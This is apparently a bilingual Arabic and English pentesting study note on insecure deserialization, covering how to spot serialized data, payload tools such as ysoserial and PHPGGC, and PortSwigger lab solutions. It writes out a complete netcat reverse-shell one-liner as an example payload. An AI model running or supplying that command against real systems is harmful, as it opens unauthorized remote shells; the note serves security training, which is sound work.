# Insecure Deserialization | إلغاء التسلسل غير الآمن

> **OWASP Category:** [A08 - Software and Data Integrity Failures](../README.md)  
> **Methodology:** [Step-?? - Deserialization Testing](../../../web-pentest-methodology/Phase-3-Vulnerability-Testing/Step-??-Deserialization-Testing.md)  
> **PortSwigger Labs:** [Solutions](../../../portswigger-labs/Advanced/Deserialization/)

---

## ما هي؟ | What is it?

تحدث هذه الثغرة عندما يقوم التطبيق بتحويل بيانات (Object) تم "تسلسلها" (Serialized) إلى صيغة نصية (مثل نصوص مشفرة بـ Base64) وإعادتها إلى حالتها الأصلية ككائن برمجي (Object) دون التحقق من سلامتها. المهاجم يقوم بتعديل هذه البيانات النصية لزرع "كائنات خبيثة" تجبر السيرفر على تنفيذ أوامر عند محاولة قراءتها.

---

## كيف تستغلها؟ (خطوات مفصلة) | How to Exploit?

### 1. مرحلة الرصد | Enumeration

- ابحث عن بيانات تبدو "مشفرة" أو "منظمة" بشكل خاص في الكوكيز أو البارامترات.
- حدد اللغة البرمجية المستخدمة:

| اللغة | شكل البيانات المسلسلة |
|-------|---------------------|
| **PHP** | تبدو البيانات مثل `a:2:{s:4:"user";s:5:"admin";}` |
| **Java** | تبدو البيانات كـ Base64 يبدأ بـ `rO0AB` |
| **Python** | تستخدم مكتبة `pickle` |
| **.NET** | تستخدم `TypeNameHandling` |

### 2. التحليل عبر Burp Suite | Analysis via Burp Suite

- استخدم إضافة **Freddy** أو **Java Deserialization Scanner** لاكتشاف الثغرة تلقائياً.
- اعترض الطلب الذي يحتوي على البيانات المسلسلة وأرسله إلى Repeater.

### 3. حقن البيانات | Exploitation Payload

- بدلاً من كتابة Payload من الصفر، استخدم أدوات توليد الـ Payloads الجاهزة:
    - **ysoserial** (لـ Java)
    - **PHPGGC** (لـ PHP)
    - **pickle** (لـ Python)

- قم بإنشاء Payload يقوم بتنفيذ أمر معين، مثلاً:
    - `sleep 10`
    - Reverse Shell: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/f`

- استبدل البيانات الأصلية بالـ Payload الجديد (بعد تشفيره بنفس الطريقة، مثلاً Base64).

### 4. تأكيد الاستغلال | Impact Verification

- إذا تأخر السيرفر في الرد (في حالة `sleep`) أو وصلك اتصال عكسي (Reverse Shell) = تم الاستغلال بنجاح (RCE).

---

## 🔍 كيفية اكتشافها في منهجيتي | How to Find in My Methodology

> 📂 **راجع ملف المنهجية التفصيلي:**  
> [Web-Pentest-Methodology - Phase 3 - Deserialization Testing](../../../web-pentest-methodology/Phase-3-Vulnerability-Testing/Step-??-Deserialization-Testing.md)

---

## 🧪 مختبرات PortSwigger | PortSwigger Labs

| المختبر | الصعوبة | الحل |
|---------|--------|------|
| Modifying serialized objects | Apprentice | [الحل](../../../portswigger-labs/Advanced/Deserialization/01-modifying-objects.md) |
| Modifying serialized data types | Apprentice | [الحل](../../../portswigger-labs/Advanced/Deserialization/02-modifying-types.md) |
| Using application functionality to exploit insecure deserialization | Practitioner | [الحل](../../../portswigger-labs/Advanced/Deserialization/03-app-functionality.md) |
| Arbitrary object injection in PHP | Practitioner | [الحل](../../../portswigger-labs/Advanced/Deserialization/04-php-injection.md) |
| Exploiting Java deserialization with Apache Commons | Practitioner | [الحل](../../../portswigger-labs/Advanced/Deserialization/05-java-commons.md) |
| Exploiting PHP deserialization with a pre-built gadget chain | Practitioner | [الحل](../../../portswigger-labs/Advanced/Deserialization/06-php-gadget-chain.md) |
| Exploiting Ruby deserialization using a documented gadget chain | Practitioner | [الحل](../../../portswigger-labs/Advanced/Deserialization/07-ruby-gadget-chain.md) |
| Developing a custom gadget chain for Java deserialization | Expert | [الحل](../../../portswigger-labs/Advanced/Deserialization/08-custom-java-chain.md) |
| Developing a custom gadget chain for PHP deserialization | Expert | [الحل](../../../portswigger-labs/Advanced/Deserialization/09-custom-php-chain.md) |
| Using PHAR deserialization to deploy a custom gadget chain | Expert | [الحل](../../../portswigger-labs/Advanced/Deserialization/10-phar-deserialization.md) |
